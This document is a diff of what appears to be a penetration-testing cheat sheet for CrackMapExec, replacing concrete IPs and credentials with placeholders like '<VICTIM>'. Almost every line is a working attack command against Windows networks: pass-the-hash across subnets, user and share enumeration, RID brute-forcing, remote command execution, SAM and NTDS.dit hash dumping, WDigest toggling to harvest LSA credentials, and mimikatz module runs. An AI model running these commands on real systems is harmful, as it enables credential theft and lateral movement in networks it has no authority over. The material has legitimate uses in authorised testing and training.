@@ -1,16 +1,16 @@
 % crackmapexec
 
 # null session
-crackmapexec smb <IP> -u "" up ""
+crackmapexec smb <IP> -u "" -p ""
 
 # connect to target using local account
-crackmapexec smb <IP> -u 'Administrator' -p 'PASSWORD' --local-auth
+crackmapexec smb <IP> -u '<VICTIM>' -p '<PASS>' --local-auth
 
 # pass the hash against a subnet
-crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
-crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'
+crackmapexec smb 172.16.157.0/24 -u '<VICTIM>' -H 'LMHASH:NTHASH' --local-auth
+crackmapexec smb 172.16.157.0/24 -u '<VICTIM>' -H 'NTHASH'
 
-# target format
+# target format subnet list fqdn
 crackmapexec smb ms.evilcorp.org
 crackmapexec smb 192.168.1.0 192.168.0.2
 crackmapexec smb 192.168.1.0-28 10.0.0.1-67
@@ -18,58 +18,59 @@ crackmapexec smb 192.168.1.0/24
 crackmapexec smb targets.txt
 
 # enumerate users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --users
+crackmapexec smb <IP_OR_SUBNET> -d '<DOMAIN>' -u '<VICTIM>' -p '<PASS>' --users
 
 # perform rid bruteforce to get users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --rid-brute
 
 # enumerate domain groups
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --groups
 
 # enumerate local users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --local-auth
 
 # generate a list of relayable hosts (smb signing disabled)
 crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt
 
 # enumerate available shares
-crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares
+crackmapexec smb 192.168.215.138 -u '<VICTIM>' -p '<PASS>' --local-auth --shares
 
 # get the active sessions
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --sessions
 
 # check logged in users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --lusers
 
 # get the password policy
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --pass-pol
 
 # execute command through cmd.exe (admin privileges required)
-crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'
+crackmapexec smb 192.168.10.11 -u '<VICTIM>' -p 'P@ssw0rd' -x 'whoami'
 
 # force the smbexec method (default order: wmiexec, atexec, smbexec)
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' -x 'net user '<VICTIM>' /domain' --exec-method smbexec
 
 # execute commands through powershell (admin privileges required)
-crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'
+crackmapexec smb 192.168.10.11 -u '<VICTIM>' -p 'P@ssw0rd' -X 'whoami'
 
 # dump local SAM hashes
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --local-auth --sam
 
 # enable/disable WDigest to get credentials from the LSA memory; force the logoff and wait for logon
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --local-auth --wdigest enable
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --local-auth --wdigest disable
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' -x 'quser'
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' -x 'logoff <sessionid>'
 
 # dump the NTDS.dit from DC using methods from secretsdump.py
-crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
+crackmapexec smb 192.168.1.100 -u '<VICTIM>' -p '<PASS>' --ntds
 
 # uses the volume shadow copy service
-crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
+crackmapexec smb 192.168.1.100 -u '<VICTIM>' -p '<PASS>' --ntds vss
 
 # dump the NTDS.dit password history
-smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
+smb 192.168.1.0/24 -u '<VICTIM>' -p '<PASS>' --ntds-history
 
 # list available modules
 crackmapexec smb -L
@@ -81,7 +82,7 @@ crackmapexec smb -M mimikatz --module-info
 crackmapexec smb -M mimikatz --options
 
 # mimikatz module
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz
-crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' --local-auth -M mimikatz
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p '<PASS>' -M mimikatz
+crackmapexec smb <IP_OR_SUBNET> -u '<VICTIM>' -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
 
